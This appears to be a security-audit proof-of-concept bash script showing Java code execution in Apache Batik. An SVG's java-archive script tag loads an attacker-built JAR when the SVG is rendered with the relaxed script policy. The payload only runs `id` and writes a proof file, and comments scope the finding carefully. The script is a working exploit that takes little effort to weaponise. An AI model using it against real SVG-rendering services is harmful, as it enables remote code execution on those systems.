#!/usr/bin/env bash
# F-8 — Java code execution via <script type="application/java-archive"> + DocumentJarClassLoader.
#
# IMPORTANT SCOPE (per second-opinion review): java-archive scripting is a DOCUMENTED Batik feature and
# is DENIED by the default policy (DefaultScriptSecurity denies SVG_SCRIPT_TYPE_JAVA). This is therefore
# NOT a default Batik RCE. It is reachable only when the embedding uses RelaxedScriptSecurity — e.g. the
# standard SVGUserAgentAdapter / SVGUserAgentGUIAdapter (which hardcode Relaxed), or Squiggle with the
# "Allowed Script Origin" preference set to ANY. A bare `new JSVGCanvas()` is NOT affected.
# DocumentJarClassLoader assigns permissions but enforces nothing without an active SecurityManager
# (deprecated since JDK 17, disabled by default since JDK 24 / JEP 486; embedders rarely install one).
# Severity: High for a downstream product that renders untrusted SVG with a relaxed Java-script policy;
# Critical only where such a service auto-processes attacker SVG without user interaction.
set -uo pipefail
LAB="${BATIK_LAB_DIR:-/tmp/batik-lab}"; cd "$LAB"
CP="$(printf '%s' "$LAB/batik-1.19/lib/*")"
rm -f "$LAB/RCE_PROOF" 2>/dev/null

# 1) attacker ScriptHandler payload -> writes a proof file with `id` output
mkdir -p payload
cat > payload/RCEPayload.java <<'JAVA'
import org.apache.batik.bridge.ScriptHandler; import org.apache.batik.bridge.Window; import org.w3c.dom.Document;
public class RCEPayload implements ScriptHandler {
  public void run(Document doc, Window win) {
    try {
      Process p = Runtime.getRuntime().exec(new String[]{"id"});
      java.io.BufferedReader r = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
      String id = r.readLine();
      java.io.FileWriter fw = new java.io.FileWriter("/tmp/batik-lab/RCE_PROOF");
      fw.write("RCE via application/java-archive ScriptHandler; id=" + id + "\n"); fw.close();
      System.out.println("RCE_PAYLOAD_RAN id=" + id);
    } catch (Throwable t) { System.out.println("payload err " + t); }
  }
}
JAVA
javac -cp "$CP" -d payload payload/RCEPayload.java
mkdir -p payload/META-INF
printf 'Manifest-Version: 1.0\nScript-Handler: RCEPayload\n\n' > payload/META-INF/MANIFEST.MF
( cd payload && jar cfm "$LAB/payload.jar" META-INF/MANIFEST.MF RCEPayload.class )

# 2) untrusted SVG referencing the java-archive script
cat > rce.svg <<'SVG'
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="20" height="20" onload="1">
  <script type="application/java-archive" xlink:href="file:///tmp/batik-lab/payload.jar"/>
  <rect width="20" height="20" fill="green"/></svg>
SVG

# 3) headless viewer using the STANDARD SVGUserAgentAdapter (RelaxedScriptSecurity)
cat > RCEProbe.java <<'JAVA'
import org.apache.batik.swing.svg.JSVGComponent;
import org.apache.batik.swing.svg.SVGUserAgentAdapter;
import org.apache.batik.anim.dom.SAXSVGDocumentFactory;
import org.apache.batik.util.XMLResourceDescriptor;
import org.w3c.dom.svg.SVGDocument; import java.io.*;
public class RCEProbe {
  public static void main(String[] a) throws Exception {
    System.setProperty("java.awt.headless","true");
    SAXSVGDocumentFactory df = new SAXSVGDocumentFactory(XMLResourceDescriptor.getXMLParserClassName());
    SVGDocument doc = df.createSVGDocument("file:///tmp/batik-lab/rce.svg", new FileInputStream("/tmp/batik-lab/rce.svg"));
    JSVGComponent comp = new JSVGComponent(new SVGUserAgentAdapter(), true, true); // RelaxedScriptSecurity
    comp.setSize(20,20); comp.setSVGDocument(doc);
    Thread.sleep(8000);
  }
}
JAVA
javac -cp "$CP" RCEProbe.java
echo "== running untrusted SVG in JSVGComponent(SVGUserAgentAdapter) — Relaxed Java-script policy =="
timeout 40 java -cp "$CP:$LAB" RCEProbe 2>&1 | grep -iE "RCE_PAYLOAD_RAN|payload err" | head -2
echo "== RCE proof file =="
[ -f "$LAB/RCE_PROOF" ] && cat "$LAB/RCE_PROOF" || echo "NO_PROOF"
echo "NOTE: the process identity in the id output reflects how the JVM was launched (root in this lab container), not a Batik privilege escalation."
